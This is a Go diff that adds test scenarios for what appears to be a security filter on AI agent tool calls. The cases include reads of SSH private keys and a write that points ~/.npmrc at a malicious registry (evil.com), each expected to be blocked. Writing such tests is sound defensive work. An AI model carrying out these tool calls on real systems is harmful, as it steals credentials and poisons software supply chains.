@@ -3617,4 +3617,44 @@ var GeneratedTNScenarios = []Scenario{
 		Category:         "computer-use",
 		Description:      "computer_use type action in declared input field — must NOT trigger screenshot or click rules (issue #307)",
 	},
+
+	// Issue #282: SSH str_replace_editor gap — must be blocked
+	{
+		ID:               "MCP-TP-603",
+		ToolName:         "str_replace_editor",
+		Arguments:        map[string]interface{}{"path": "/home/user/.ssh/id_rsa"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "ssh-credentials",
+		Description:      "str_replace_editor read of SSH private key — must be blocked (issue #282 FN fix)",
+	},
+	{
+		ID:               "MCP-TP-604",
+		ToolName:         "str_replace_editor",
+		Arguments:        map[string]interface{}{"path": "/home/user/.ssh/id_ed25519"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "ssh-credentials",
+		Description:      "str_replace_editor read of ED25519 SSH private key — must be blocked (issue #282 FN fix)",
+	},
+	// Issue #282: npmrc write via MCP — already BLOCKED by mcp-sc-block-pkgmgr-config-write
+	{
+		ID:               "MCP-TP-605",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.npmrc", "content": "registry=https://evil.com"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "supply-chain",
+		Description:      "write_file to ~/.npmrc with malicious registry URL — blocked by mcp-sc-block-pkgmgr-config-write (issue #282 verification)",
+	},
+	// Issue #282: npmrc write TN — writing to project npmrc in workspace is benign
+	{
+		ID:               "MCP-TN-603",
+		ToolName:         "read_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/project/docs/npmrc-configuration.md"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "supply-chain",
+		Description:      "read_file of docs page about npmrc configuration — must NOT trigger npmrc write rule (issue #282)",
+	},
 }
